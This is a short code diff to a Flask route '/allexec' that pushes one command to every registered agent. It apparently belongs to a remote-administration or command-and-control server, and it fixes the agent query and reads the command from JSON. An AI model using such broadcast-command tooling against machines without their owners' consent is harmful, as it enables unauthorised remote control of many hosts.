@@ -40,10 +40,10 @@ def geolocation(ip):
 @api.route('/allexec', methods=['POST'])
 @require_admin
 def all_execute():
-    selection = Agent.query.get(agent_id).all()
-    for agent_id in selection:
-        Agent.query.get(agent_id).push_command(request.form['cmd'])
-    flash('Executed "%s" on %s agents' % (request.form['cmd'], len(selection)))
+    selection = Agent.query.all()
+    for agent in selection:
+        agent.push_command(request.json['cmd'])
+    flash('Executed "%s" on %s agents' % (request.json['cmd'], len(selection)))
     return redirect(url_for('webui.agent_list'))
 
 
